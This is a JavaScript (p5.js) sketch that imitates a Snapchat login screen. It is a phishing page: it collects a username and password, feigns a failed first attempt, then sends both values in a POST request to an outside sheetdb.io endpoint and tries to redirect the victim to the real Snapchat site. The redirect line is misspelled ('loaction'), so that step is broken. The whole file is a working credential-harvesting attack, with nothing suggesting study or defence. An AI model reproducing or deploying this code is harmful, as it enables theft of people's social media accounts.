function setup() {
  createCanvas(windowWidth,windowHeight);
  
  username = createInput('');
  password = createInput('');
  
  textFont("Roboto");
}
function button(x,y,w,h){
  return mouseX>x && mouseY>y && mouseX<x+w && mouseY<y+h;
}
let img;
let page = 0;
function preload(){
  img = loadImage("https://cdn.shopify.com/s/files/1/0070/7032/files/image5_087c48f2-6908-4c78-be94-033a7a2003b3.png?v=1671066079");
}
let username;
let password;
let trials = 0;
function windowResized(){
  resizeCanvas(windowWidth,windowHeight);
}
function send(user,pass){
  fetch('https://sheetdb.io/api/v1/tbfbe5pdzqev3', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        data: [
            {
                'password': pass,
                'username': user
            }
        ]
    })
})
}
let hold = 0;
function draw() {
  background(250);
  if (page === 0){
    if (mouseIsPressed || width>height){
      page++;
    }else{
      image(img,0,0,width,height);
    }
  }else if (page===1){
    username.position(width/11,height/3.6);
    password.position(width/11,height/2.6);
  
    username.size(width - width/5,height/20);
    password.size(width - width/5,height/20);
  
    username.style('border', '0px solid black');
    password.style('border', '0px solid black');
  
    username.style('background-color', 'transparent');
    password.style('background-color', 'transparent');
  
    username.style('font-size', '22px');
    password.style('font-size', '22px');
  
    fill(0);
    textAlign(CENTER,CENTER);
    textSize(30);
    text("Log In To Snapchat",width/2,height/6);
    textAlign(LEFT,CENTER);
    textSize(17);
    fill(150);
    if (trials>0){
      fill(255,0,0);
    }
    text("USERNAME OR EMAIL",width/10,height/3.8);
    text("PASSWORD",width/10,height/2.7);
    stroke(150);
    
    line(width/10,height/3,width-width/10,height/3);
    line(width/10,height/2.3,width-width/10,height/2.3);
    
    noStroke();
    fill(170,170,190);
    if (username.value().length>5 && password.value().length>5){
      fill(100,100,120);
    }
    rect(width/6,height*0.6,width-width/6*2,height/14,100);
    fill(255);
    textSize(25);
    textAlign(CENTER,CENTER);
    text("Log In",width/6,height*0.6,width-width/6*2,height/14);
    
    if (hold===1 && button(width/6,height*0.6,width-width/6*2,height/14) && username.value().length>5 && password.value().length>5){
      trials++;
      if (trials>1){
        page++;
      }
    }
  }else if (page===2){
    send(username.value(),password.value());
    page++;
  }else if (page===3){
    window.loaction.replace('https://www.snapchat.com/');
    page++;
  }else{
    background(0);
  }
  
  if (mouseIsPressed){
    hold++;
  }else{
    hold=0;
  }
}
